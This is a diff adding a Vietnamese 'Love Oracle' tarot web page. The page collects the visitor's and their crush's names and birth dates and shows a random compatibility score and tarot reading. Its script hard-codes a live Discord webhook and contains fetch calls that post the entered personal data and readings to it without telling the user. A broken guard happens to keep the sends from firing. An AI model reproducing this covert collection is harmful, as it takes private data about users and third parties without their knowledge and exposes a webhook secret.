@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love Oracle Tarot 🔮</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box;font-family:'Poppins',sans-serif}
+body{
+margin:0;min-height:100vh;
+display:flex;align-items:center;justify-content:center;
+background:linear-gradient(135deg,#ff9acb,#8a2be2);
+overflow:hidden;color:white;
+}
+.container{
+background:rgba(255,255,255,0.12);
+backdrop-filter:blur(10px);
+border-radius:28px;
+padding:28px;
+width:360px;
+box-shadow:0 0 40px rgba(0,0,0,0.3);
+text-align:center;
+animation:glow 3s infinite alternate;
+}
+@keyframes glow{
+from{box-shadow:0 0 20px #ff9acb;}
+to{box-shadow:0 0 50px #8a2be2;}
+}
+.title{
+font-family:'Great Vibes',cursive;
+font-size:42px;
+margin-bottom:10px;
+}
+input,button{
+width:100%;
+padding:12px;
+border-radius:14px;
+border:none;
+margin-top:8px;
+font-size:14px;
+}
+input{
+background:rgba(255,255,255,0.2);
+color:white;
+outline:none;
+}
+button{
+background:#ff4f9a;
+color:white;
+font-weight:600;
+cursor:pointer;
+transition:.3s;
+}
+button:hover{transform:scale(1.05)}
+.hidden{display:none}
+
+.cardBox{
+display:flex;
+gap:10px;
+justify-content:center;
+margin-top:10px;
+}
+.card{
+width:90px;height:140px;
+background:linear-gradient(135deg,#ffb6d5,#a855f7);
+border-radius:12px;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:11px;
+font-weight:600;
+padding:6px;
+text-align:center;
+white-space:pre-line;
+box-shadow:0 0 15px rgba(0,0,0,0.4);
+}
+.reading{
+margin-top:10px;
+font-size:13px;
+text-align:left;
+line-height:1.5;
+max-height:220px;
+overflow:auto;
+padding-right:5px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<div class="title">Love Oracle</div>
+
+<input id="myName" placeholder="Tên bạn">
+<input id="myDob" type="date">
+<input id="crushName" placeholder="Tên người ấy">
+<input id="crushDob" type="date">
+
+<button onclick="startOracle()">KÍCH HOẠT ĐỊNH MỆNH 🔮</button>
+
+<div id="result" class="hidden">
+<p id="percentText"></p>
+<p id="shortMsg"></p>
+<button onclick="drawTarot()">TRẢI BÀI TAROT 🔮</button>
+</div>
+
+<div id="tarotBox" class="hidden">
+<div class="cardBox" id="cards"></div>
+<div class="reading" id="reading"></div>
+<button onclick="resetAll()">XEM LẠI</button>
+</div>
+
+</div>
+
+<script>
+// ================= CONFIG =================
+const webhook = "https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P"; 
+// ví dụ: https://discord.com/api/webhooks/123456/abcxyz
+
+// ================= DATA =================
+const tarotDeck = [
+"The Lovers","The Sun","The Moon","The Star","The Devil",
+"The Tower","Death","The Fool","Judgement","Temperance","The World"
+];
+
+let percent = 0;
+let tarotResultText = "";
+
+// ================= LOGIC =================
+function randomPercent(){
+return Math.floor(Math.random()*41)+60; // 60–100
+}
+
+function startOracle(){
+const myName=document.getElementById('myName').value.trim();
+const myDob=document.getElementById('myDob').value;
+const crushName=document.getElementById('crushName').value.trim();
+const crushDob=document.getElementById('crushDob').value;
+
+if(!myName||!myDob||!crushName||!crushDob){
+alert("Nhập đầy đủ thông tin");return;
+}
+
+percent=randomPercent();
+
+document.getElementById('result').classList.remove('hidden');
+document.getElementById('percentText').innerText=`Độ hòa hợp định mệnh: ${percent}%`;
+
+let msg="";
+if(percent>85) msg="💞 Soulmate Link — Liên kết linh hồn mạnh mẽ";
+else if(percent>70) msg="💖 Nghiệp duyên sâu — Có tiềm năng lâu dài";
+else msg="⚠️ Mối quan hệ mang tính bài học nghiệp";
+
+document.getElementById('shortMsg').innerText=msg;
+
+// ===== SEND WEBHOOK START =====
+if(webhook && !webhook.includes("https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P")){
+fetch(webhook,{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+content:`🔮 LOVE ORACLE START
+👤 ${myName} (${myDob})
+💘 ${crushName} (${crushDob})
+💞 Độ hòa hợp: ${percent}%`
+})
+});
+}
+}
+
+// ================= TAROT =================
+function drawTarot(){
+document.getElementById('tarotBox').classList.remove('hidden');
+
+const cardsDiv=document.getElementById('cards');
+const readingDiv=document.getElementById('reading');
+cardsDiv.innerHTML="";
+readingDiv.innerHTML="";
+
+const positions=["Quá khứ","Hiện tại","Tương lai"];
+let used=[];
+
+let readingText="";
+
+positions.forEach(pos=>{
+let card;
+do{
+card=tarotDeck[Math.floor(Math.random()*tarotDeck.length)];
+}while(used.includes(card));
+used.push(card);
+
+const div=document.createElement('div');
+div.className='card';
+div.innerText=`${pos}\n${card}`;
+cardsDiv.appendChild(div);
+
+const text = `${pos}: ${card} — Thông điệp: Nghiệp duyên, kết nối linh hồn và bài học cảm xúc.`;
+
+readingDiv.innerHTML+=`<p><b>${pos}: ${card}</b><br>🔮 ${text}</p>`;
+readingText+=`${text}\n\n`;
+});
+
+let summary = percent>85 ? 
+"Soulmate mạnh – liên kết linh hồn cấp độ cao" :
+percent>70 ?
+"Nghiệp duyên sâu – có thể phát triển lâu dài" :
+"Mối quan hệ mang tính bài học nghiệp";
+
+readingDiv.innerHTML+=`<hr><b>🌌 TỔNG KẾT:</b> ${summary}`;
+readingText+=`TỔNG KẾT: ${summary}`;
+
+tarotResultText = readingText;
+
+// ===== SEND WEBHOOK TAROT =====
+if(webhook && !webhook.includes("https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P")){
+fetch(webhook,{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+content:`🔮 LOVE ORACLE TAROT 🔮
+💞 Độ hòa hợp: ${percent}%
+
+🃏 TRẢI BÀI:
+${tarotResultText}`
+})
+});
+}
+}
+
+// ================= RESET =================
+function resetAll(){
+document.getElementById('tarotBox').classList.add('hidden');
+document.getElementById('result').classList.add('hidden');
+}
+</script>
+
+</body>
+</html>
